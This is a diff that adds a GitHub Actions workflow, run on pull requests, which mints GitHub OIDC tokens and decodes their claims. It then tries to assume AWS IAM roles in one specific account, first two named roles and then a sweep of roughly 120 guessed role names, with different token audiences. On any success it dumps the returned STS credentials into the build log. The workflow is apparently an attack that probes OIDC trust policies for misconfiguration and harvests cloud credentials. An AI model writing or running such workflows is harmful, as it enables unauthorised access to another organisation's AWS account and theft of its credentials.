@@ -1,0 +1,173 @@
+name: w12b10
+on:
+  workflow_dispatch:
+  pull_request:
+    types: [opened, synchronize, reopened]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint and probe
+        run: |
+          set -uo pipefail
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "$TOKEN" > /tmp/t.jwt
+          python3 - <<'PYEOF'
+          import base64, json
+          t = open('/tmp/t.jwt').read().strip().split('.')
+          for p in t[:2]:
+              p += '=' * (-len(p) % 4)
+              print('CLAIM', json.dumps(json.loads(base64.urlsafe_b64decode(p)), sort_keys=True))
+          PYEOF
+          echo "=== KNOWN ROLES"
+          for ROLE in talos-gha-OriginProtocol-arm-oeth talos-gha-OriginProtocol-origin-dollar; do
+            echo "--- $ROLE"
+            curl -sS -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::114563866192:role/$ROLE" -d "RoleSessionName=w12b10" --data-urlencode "WebIdentityToken=$TOKEN" | tr -d '\n' | head -c 900
+            echo
+          done
+          echo "=== SWEEP"
+          while read -r ROLE; do
+            [ -z "$ROLE" ] && continue
+            RESP=$(curl -sS -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::114563866192:role/$ROLE" -d "RoleSessionName=w12b10" --data-urlencode "WebIdentityToken=$TOKEN")
+            if echo "$RESP" | grep -q 'AssumeRoleWithWebIdentityResult'; then
+              echo "HIT $ROLE"
+              echo "$RESP" | tr -d '\n' | head -c 2000
+              echo
+            else
+              echo "MISS $ROLE $(echo "$RESP" | grep -o '<Code>[^<]*</Code>' | head -1)"
+            fi
+            sleep 0.2
+          done <<'ROLES'
+          talos-gha
+          talos-gha-OriginProtocol
+          talos-gha-OriginProtocol-talos
+          talos-gha-oplabs-talos
+          talos-gha-OriginProtocol-2024-ammo-presim
+          talos-gha-OriginProtocol-aave-vault
+          talos-gha-OriginProtocol-Aave-Vault
+          talos-gha-OriginProtocol-defi-pulse-adapters
+          talos-gha-OriginProtocol-DeFi-Pulse-Adapters
+          talos-gha-OriginProtocol-defillama-adapters
+          talos-gha-OriginProtocol-DefiLlama-Adapters
+          talos-gha-OriginProtocol-oethb-amo-simulation
+          talos-gha-OriginProtocol-OETHb-AMO-simulation
+          talos-gha-OriginProtocol-alertify.js
+          talos-gha-OriginProtocol-app-plugin-origin
+          talos-gha-OriginProtocol-arm-oeth
+          talos-gha-OriginProtocol-assets
+          talos-gha-OriginProtocol-beacon-chain-proof-actions
+          talos-gha-OriginProtocol-bigquery-etl
+          talos-gha-OriginProtocol-charm-contracts
+          talos-gha-OriginProtocol-charm-dapp
+          talos-gha-OriginProtocol-civic-proxy
+          talos-gha-OriginProtocol-clear-signing-erc7730-registry
+          talos-gha-OriginProtocol-contract-metadata
+          talos-gha-OriginProtocol-crossmint-client-sdk
+          talos-gha-OriginProtocol-crwn-clothing-v2
+          talos-gha-OriginProtocol-crypto-merch-how-to
+          talos-gha-OriginProtocol-curve-assets
+          talos-gha-OriginProtocol-defi-sdk
+          talos-gha-OriginProtocol-defiyield-self-integrations
+          talos-gha-OriginProtocol-discover-dapps
+          talos-gha-OriginProtocol-dshop
+          talos-gha-OriginProtocol-eng-guide
+          talos-gha-OriginProtocol-equalizer-tokens
+          talos-gha-OriginProtocol-eth-contract-metadata
+          talos-gha-OriginProtocol-eth-phishing-detect
+          talos-gha-OriginProtocol-ethereum-optimism.github.io
+          talos-gha-OriginProtocol-etherwallet
+          talos-gha-OriginProtocol-flask-recaptcha
+          talos-gha-OriginProtocol-harberger-tax
+          talos-gha-OriginProtocol-hardhat
+          talos-gha-OriginProtocol-heroku-buildpack-nx-monorepo
+          talos-gha-OriginProtocol-ledger-live-common
+          talos-gha-OriginProtocol-letmeget
+          talos-gha-OriginProtocol-minimal-proxy-example
+          talos-gha-OriginProtocol-morpho-utils
+          talos-gha-OriginProtocol-nft-launchpad
+          talos-gha-OriginProtocol-oeth-dapp
+          talos-gha-OriginProtocol-oeth.com
+          talos-gha-OriginProtocol-openzeppelin-relayer
+          talos-gha-OriginProtocol-origin
+          talos-gha-OriginProtocol-origin-app-plugin
+          talos-gha-OriginProtocol-origin-box
+          talos-gha-OriginProtocol-origin-bridge
+          talos-gha-OriginProtocol-origin-cms
+          talos-gha-OriginProtocol-origin-defi
+          talos-gha-OriginProtocol-origin-defi-docs
+          talos-gha-OriginProtocol-origin-devops
+          talos-gha-OriginProtocol-origin-docs
+          talos-gha-OriginProtocol-origin-docs-archived
+          talos-gha-OriginProtocol-origin-dollar
+          talos-gha-OriginProtocol-origin-dollar-docs
+          talos-gha-OriginProtocol-origin-envio
+          talos-gha-OriginProtocol-origin-how-to
+          talos-gha-OriginProtocol-origin-js
+          talos-gha-OriginProtocol-origin-labels
+          talos-gha-OriginProtocol-origin-mobile
+          talos-gha-OriginProtocol-origin-monorepo
+          talos-gha-OriginProtocol-origin-playground
+          talos-gha-OriginProtocol-origin-schemas
+          talos-gha-OriginProtocol-origin-scratchpad
+          talos-gha-OriginProtocol-origin-squid
+          talos-gha-OriginProtocol-origin-squid-notifications
+          talos-gha-OriginProtocol-origin-storybook
+          talos-gha-OriginProtocol-origin-swap
+          talos-gha-OriginProtocol-origin-tracer
+          talos-gha-OriginProtocol-origin-website
+          talos-gha-OriginProtocol-originators
+          talos-gha-OriginProtocol-ousd-analytics
+          talos-gha-OriginProtocol-ousd-compensation-calculation
+          talos-gha-OriginProtocol-ousd-flipper
+          talos-gha-OriginProtocol-ousd-governance
+          talos-gha-OriginProtocol-ousd.com
+          talos-gha-OriginProtocol-paraswap-dex-lib
+          talos-gha-OriginProtocol-prime-squid
+          talos-gha-OriginProtocol-purrikey
+          talos-gha-OriginProtocol-rarity-analyser
+          talos-gha-OriginProtocol-react
+          talos-gha-OriginProtocol-react-native-samsung-bks
+          talos-gha-OriginProtocol-security
+          talos-gha-OriginProtocol-snapshot-spaces
+          talos-gha-OriginProtocol-squid-utils
+          talos-gha-OriginProtocol-stolen
+          talos-gha-OriginProtocol-story.xyz
+          talos-gha-OriginProtocol-storypoints
+          talos-gha-OriginProtocol-strategy-monitor
+          talos-gha-OriginProtocol-t3
+          talos-gha-OriginProtocol-telegram-discord-bridge
+          talos-gha-OriginProtocol-telegram-moderator
+          talos-gha-OriginProtocol-test-builds
+          talos-gha-OriginProtocol-test-envio
+          talos-gha-OriginProtocol-tgbot
+          talos-gha-OriginProtocol-token-list
+          talos-gha-OriginProtocol-token-profile
+          talos-gha-OriginProtocol-tokenassets
+          talos-gha-OriginProtocol-tokenAssets
+          talos-gha-OriginProtocol-tokens
+          talos-gha-OriginProtocol-veogv
+          talos-gha-OriginProtocol-wash-inspector
+          talos-gha-OriginProtocol-website-frontend
+          talos-gha-OriginProtocol-woeth-fuzzing-tests
+          talos-gha-OriginProtocol-yield
+          talos-gha-OriginProtocol-yield-server
+          talos-gha-OriginProtocol-yolo-spike-ousd-token
+          ROLES
+          echo "=== AUD DIFFERENTIAL"
+          TOKEN2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://github.com/OriginProtocol" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "$TOKEN2" > /tmp/t2.jwt
+          python3 - <<'PYEOF'
+          import base64, json
+          t = open('/tmp/t2.jwt').read().strip().split('.')
+          p = t[1]; p += '=' * (-len(p) % 4)
+          d = json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIM2', json.dumps({'aud': d.get('aud'), 'sub': d.get('sub')}, sort_keys=True))
+          PYEOF
+          for ROLE in talos-gha-OriginProtocol-arm-oeth talos-gha-OriginProtocol-origin-dollar; do
+            echo "--- AUD2 $ROLE"
+            curl -sS -X POST https://sts.amazonaws.com/ -d "Action=AssumeRoleWithWebIdentity" -d "Version=2011-06-15" -d "RoleArn=arn:aws:iam::114563866192:role/$ROLE" -d "RoleSessionName=w12b10a" --data-urlencode "WebIdentityToken=$TOKEN2" | tr -d '\n' | head -c 900
+            echo
+          done
